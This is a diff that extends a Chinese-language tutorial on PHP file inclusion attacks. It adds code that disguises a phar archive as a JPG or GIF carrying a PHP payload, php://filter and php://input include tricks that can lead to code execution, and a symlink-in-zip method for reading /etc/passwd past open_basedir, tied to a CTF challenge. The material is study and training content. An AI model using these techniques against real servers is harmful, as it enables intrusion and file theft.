@@ -172,9 +172,21 @@ php://input 是个可以访问请求的原始数据的只读流(这个原始数�
 php 5.3时，为php的C语言扩展，安装php时会默认安装。
 特点就是能将任意后缀名的压缩包解包，得到里面指定的内容，这个方法在绕过后缀名限定的包含中非常好用。
 ```php
+class TestObject {
+}
+$phar = new Phar("my.jpg");
+$phar->startBuffering();
+$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
+$o = new TestObject;
+$phar->setMetadata($o); //将自定义的meta-data存入manifest
+$phar->addFromString("shell.php", "<?php phpinfo(); ?>"); //添加要压缩的文件
+//签名自动计算
+$phar->stopBuffering();
+```
+```php
 callphar.php
 <?php
-    include 'phar://my.phar/shell.php';
+    include 'phar://my.jpg/shell.php';
 ?>
 ```
 访问callphar.php即可调用shell.php，注意：phar文件不受文件名限制，即my.phar可以任意的重命名为aaa.bbb
@@ -184,3 +196,81 @@ callphar.php
     include 'phar://aaa.bbb/shell.php';
 ?>
 ```
+### **phar更改文件头魔术**
+在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT_COMPILER();?>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。
+```php
+
+$phar = new Phar('phar.phar');
+$phar -> startBuffering();
+// 增加GIF89a文件magic
+$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');   //设置stub，增加gif文件头
+$phar ->addFromString('test.txt','<?php phpinfo(); ?>');  //添加要压缩的文件
+$object = new TestObject();
+$object -> data = 'hu3sky';
+$phar -> setMetadata($object);  //将自定义meta-data存入manifest
+$phar -> stopBuffering();
+```
+### **php://filter**
+![avatar](../images/php_filter.png)
+```php
+/* 这简单等同于：
+  readfile("http://www.example.com");
+  实际上没有指定过滤器 */
+readfile("php://filter/resource=http://www.example.com");
+/* 这会以大写字母输出 www.example.com 的全部内容 */
+readfile("php://filter/read=string.toupper/resource=http://www.example.com");
+/* 这会和以上所做的一样，但还会用 ROT13 加密。 */
+readfile("php://filter/read=string.toupper|string.rot13/resource=http://www.example.com");
+/* 这会通过 rot13 过滤器筛选出字符 "Hello World"
+  然后写入当前目录下的 example.txt */
+file_put_contents("php://filter/write=string.rot13/resource=example.txt","Hello World");
+```
+1、字符串过滤器：
+* string.rot13 对字符串执行ROT13转换
+* string.toupper转换为大写
+* string.tolower 转换为小写
+* string.strip_tags去除html和php标记
+
+2、转换过滤器：
+* convert.base64-encode & convert.base64-decode ：base64编码/解码
+* convert.quoted-printable-encode & convert.quoted-printable-decode：将 quoted-printable 字符串转换为 8-bit 字符串
+
+3、压缩过滤器：
+* zlib.deflate和 zlib.inflate
+* bzip2.compress和 bzip2.decompress
+
+4、加密过滤器：
+* mcrypt.tripledes和mdecrypt.tripledes等
+
+```php
+<?php
+include "php://filter/read=convert.base64-decode/resource=php://input";
+include "php://filter/read=convert.base64-decode/resource=phar://./phar.phar/test.txt";
+```
+参考：https://www.php.net/manual/zh/wrappers.php.php
+
+### **通过软链接文件**
+通过软链接的方式进行文件读取包含可绕过open_basedir的限制
+相关赛题：HCTF2018 hide and seek : https://xz.aliyun.com/t/3245#toc-6.
+我们首先构造一个指向 /etc/passwd 的软链接文件，看看能不能成功
+```sh
+root@ubuntu:~# ln -s /etc/passwd test
+看一下软链接的指向
+lrwxrwxrwx  1 root root     11 Nov 11 06:45 test -> /etc/passwd
+现在我们把这个文件进行压缩
+root@ubuntu:~# zip -y test.zip test
+```
+上传然后 submit，借助文件包含漏洞，可任意读取相关文件，即使有open_basedir的限制.
+
+## **参考文献**
+【1】[Facebook本地文件读取漏洞]. http://www.vuln.cn/8132<br>
+【2】[HCTF2018 Writeup]. https://xz.aliyun.com/t/3245#toc-6<br>
+【3】[常见文件包含发生场景与防御]. https://www.anquanke.com/post/id/86123<br>
+【4】[Session 上传进度]. http://php.net/manual/zh/session.upload-progress.php<br>
+【6】[php伪协议实现命令执行的七种姿势]. https://www.freebuf.com/column/148886.html<br>
+【7】[包含日志文件getshell]. http://www.cnblogs.com/my1e3/p/5854897.html<br>
+【8】http://www.k0rz3n.com/2018/11/20/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8B%20PHP%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/<br>
+【9】[Session upload 文件包含].https://www.jianshu.com/p/051a87f45222?utm_campaign=maleskine&utm_content=note&utm_medium=reader_share&utm_source=weixin<br>
+【10】http://wonderkun.cc/index.html/?p=718<br>
+【11】[软连接文件包含绕过open_basedir].https://xz.aliyun.com/t/2589<br>
+【12】http://www.vuln.cn/8132<br>
